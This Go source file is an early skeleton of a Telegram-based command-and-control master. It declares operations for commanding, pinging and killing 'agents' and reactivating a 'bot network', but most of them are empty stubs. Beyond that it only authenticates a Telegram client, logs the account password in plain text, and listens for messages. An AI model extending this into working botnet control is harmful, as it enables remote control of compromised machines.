package c2

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"strings"

	"telegram-c2/internal/pkg/config"
	"telegram-c2/internal/pkg/models"

	"github.com/go-faster/errors"
	telegram "github.com/gotd/td/telegram"
	"github.com/gotd/td/telegram/auth"
	"github.com/gotd/td/telegram/updates"
	"github.com/gotd/td/tg"
	"go.uber.org/zap"
	"go.uber.org/zap/zapcore"
)

type TgC2 struct {
	client        *telegram.Client
	logger        *zap.Logger
	updateManager *updates.Manager
	dispatcher    tg.UpdateDispatcher
}

type ITgC2 interface {
	BroadcastCommand(command string) error
	SendCommandToAgent(command string) error
	ListenForNewAgents() error
	RetrieveAgents() error
	PingAgent() error
	GetActiveAgents() error
	KillAgent() error
	KillAllAgents() error
}

func NewTgC2(c *config.Config) *TgC2 {
	log.Println("Initiating new telegram client to act as C2 Master")
	client := telegram.NewClient(c.ClientAPPID, c.ClientAPPHash, telegram.Options{})
	logger, err := zap.NewDevelopment(zap.IncreaseLevel(zapcore.InfoLevel), zap.AddStacktrace(zapcore.FatalLevel))
	if err != nil {
		log.Fatalf("Error setting up logger for client")
	}

	dispatcher := tg.NewUpdateDispatcher()
	updater := updates.New(updates.Config{
		Handler: dispatcher,
		Logger:  logger.Named("gaps"),
	})

	c2 := &TgC2{
		client:        client,
		logger:        logger,
		updateManager: updater,
		dispatcher:    dispatcher,
	}

	c2.reactivateBotNetwork()
	c2.ListenForNewAgents()

	return c2
}

func (c2 *TgC2) BroadcastCommand(command string) error {
	return nil
}

func (c2 *TgC2) SendCommandToAgent() error {
	return nil
}

func (c2 *TgC2) ListenForNewAgents() error {
	ctx := context.Background()
	config := config.NewConfig()

	log.Printf("Initializing dispatcher")
	c2.dispatcher.OnNewMessage(func(ctx context.Context, e tg.Entities, update *tg.UpdateNewMessage) error {
		c2.logger.Info("Got new message")
		for _, user := range e.Users {
			log.Printf("Recieved message from %s", user.FirstName)
		}
		return nil
	})

	log.Printf("Running listener")
	c2.client.Run(ctx, func(ctx context.Context) error {
		// Perform auth if no session is available.
		log.Println("Authenticating new client")

		log.Println(config.Password)

		authFlow := auth.NewFlow(
			auth.Constant(config.Phone, config.Password, auth.CodeAuthenticatorFunc(codePrompt)),
			auth.SendCodeOptions{},
		)

		if err := c2.client.Auth().IfNecessary(ctx, authFlow); err != nil {
			log.Fatalln("Failed with error: %s", err)
			return errors.Wrap(err, "auth")
		}

		// Fetch user info.
		user, err := c2.client.Self(ctx)
		if err != nil {
			log.Fatalf("Error getting self")
			return errors.Wrap(err, "call self")
		}
		log.Printf("client name = %s", user.FirstName)

		return c2.updateManager.Run(ctx, c2.client.API(), user.ID, updates.AuthOptions{
			OnStart: func(ctx context.Context) {
				log.Print("Gaps started")
			},
		})
	})

	return nil
}

func codePrompt(ctx context.Context, sentCode *tg.AuthSentCode) (string, error) {
	// NB: Use "golang.org/x/crypto/ssh/terminal" to prompt password.
	fmt.Print("Enter code: ")
	code, err := bufio.NewReader(os.Stdin).ReadString('\n')
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(code), nil
}

func (c2 *TgC2) RetrieveAgents() error {
	return nil
}

func (c2 *TgC2) PingAgent() error {
	return nil
}

func (c2 *TgC2) GetActiveAgents() error {
	return nil
}

func (c2 *TgC2) KillAgent() error {
	return nil
}

func (c2 *TgC2) reactivateBotNetwork() error {
	agents := make([]models.Agent, 0, 5) // Replace with data from the database
	totalAgents := len(agents)
	activatedAgents := 0

	// c2.client.Run(context.Background(), func(ctx context.Context) error {
	// 	var wait sync.WaitGroup
	// 	for _, agent := range agents {
	// 		wait.Add(1)
	// 		go func() {
	// 			defer wait.Done()
	// 			c2.activateAgent(agent)
	// 			activatedAgents++
	// 		}()
	// 	}
	// 	wait.Wait()
	// 	return nil
	// })

	log.Printf("Network previously had %d agents\n", totalAgents)
	log.Printf("Network activated with %d agents\n", activatedAgents)
	return nil
}

func (c2 *TgC2) activateAgent(agent models.Agent) error {
	log.Printf("Activated new agent %s", agent.TelegramID)
	return nil
}
